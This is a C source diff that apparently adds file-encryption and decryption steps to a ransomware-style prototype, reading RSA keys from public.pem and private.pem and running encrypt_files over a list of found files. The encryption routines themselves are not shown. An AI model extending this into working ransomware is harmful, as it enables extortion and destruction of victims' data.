@@ -10,6 +10,7 @@
 #include <openssl/decoder.h>
 
 #include "files_finder.h"
+#include "crypto.h"
 
 int g_safeMode = 1;
 
@@ -96,10 +97,38 @@ int main(int argc, char const *argv[])
     FILE* p_pubKeyFile = fopen("public.pem", "r");
     if (p_pubKeyFile == NULL)
     {
-        perror("fopen");
+        perror("[-] Encryption key GET failed");
         exit(1);
     }
-    RSA* p_pubKey = PEM_read_RSA_PUBKEY(p_pubKeyFile, NULL, NULL, NULL);
+    RSA* p_pubKey = PEM_read_RSAPublicKey(p_pubKeyFile, NULL, NULL, NULL);
+    //RSA_print_fp(stdout, p_pubKey, 0);
+
+    fclose(p_pubKeyFile);
+
+    printf("[+] Encryption key GET success\n");
+
+    /* Encrypt files */
+    encrypt_files(p_listFileData, p_pubKey);
+
+    RSA_free(p_pubKey);
+
+    /* Get RSA private key from a file */
+    FILE* p_privKeyFile = fopen("private.pem", "r");
+    if (p_privKeyFile == NULL)
+    {
+        perror("[-] Decryption key GET failed");
+        exit(1);
+    }
+    RSA* p_privKey = PEM_read_RSAPrivateKey(p_privKeyFile, NULL, NULL, NULL);
+
+    fclose(p_privKeyFile);
+
+    printf("[+] Encryption key GET success\n");
+
+    /* Decrypt files */
+    decrypt_files(p_listFileData, p_privKey);
+
+    RSA_free(p_privKey);
 
 
     //dctx = OSSL_DECODER_CTX_new_for_pkey(&pkey, format, structure,
